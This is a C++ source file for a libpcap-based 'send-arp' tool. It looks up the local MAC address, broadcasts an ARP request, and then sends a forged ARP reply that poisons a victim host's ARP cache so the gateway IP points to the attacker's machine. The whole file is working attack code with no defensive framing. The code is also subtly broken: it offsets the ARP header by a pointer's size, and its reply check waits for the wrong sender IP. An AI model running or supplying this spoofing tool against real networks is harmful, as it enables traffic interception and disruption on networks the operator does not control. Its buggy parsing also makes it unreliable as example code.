#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <linux/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

// Mac MyMac = NULL;
pcap_t* handle;

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac GetMyMac(char* interface) {
	struct ifreq ifr;
	int sk = socket(AF_INET, SOCK_DGRAM, 0);
	
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, interface);
	
	int ret = ioctl(sk, SIOCGIFHWADDR, &ifr);
	
	return Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
}

int send_arp_packet(char* dev, Mac Destination_Mac, Mac Source_Mac, Mac Target_Mac, Ip Source_Ip, Ip Target_Ip, bool Request) {
	
	char errbuf[PCAP_ERRBUF_SIZE];
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	EthArpPacket packet;
	
	packet.eth_.dmac_ = Destination_Mac;
	packet.eth_.smac_ = Source_Mac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	
	packet.arp_.op_ = Request ? htons(ArpHdr::Request) : htons(ArpHdr::Reply);
	packet.arp_.smac_ = Source_Mac;
	packet.arp_.sip_ = htonl(Source_Ip);
	packet.arp_.tmac_ = Target_Mac;
	packet.arp_.tip_ = htonl(Target_Ip);
	
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
	return res;
}

int main(int argc, char* argv[]) {

	if(argc < 4 || argc % 2 == 1) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	Mac MyMac = GetMyMac(dev);

	for(int idx = 2; idx < argc; idx += 2) {
	
		Ip target_ip = Ip(argv[idx]);
		Ip victim_ip = Ip(argv[idx + 1]);
	
		// Send Arp Broadcast
		Mac Broadcast_Mac = Mac("ff:ff:ff:ff:ff:ff");
		Mac Target_Mac = Mac("00:00:00:00:00:00");
	
		send_arp_packet(dev, Broadcast_Mac, MyMac, Target_Mac, victim_ip, target_ip, true);
	
		// Parsing Replied packet & Get Victim's Mac Address
		Mac Victim_Mac;
	
		while (true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
		
			EthHdr* eth_hdr = (EthHdr*) packet;
			if(eth_hdr->type() == EthHdr::Arp) {
				ArpHdr* arp_hdr = (ArpHdr*) (packet + sizeof(eth_hdr));
				if(arp_hdr->op() == ArpHdr::Reply && arp_hdr->sip() == victim_ip) {
					// Success!!!
					Victim_Mac = arp_hdr->smac();
					break;
				} else {
					continue;
				}
			} else {
				continue;
			}
		}
		
		// Arp spoofing
		send_arp_packet(dev, Victim_Mac, MyMac, Victim_Mac, target_ip, victim_ip, false);
	}
		
	return 0;	
}
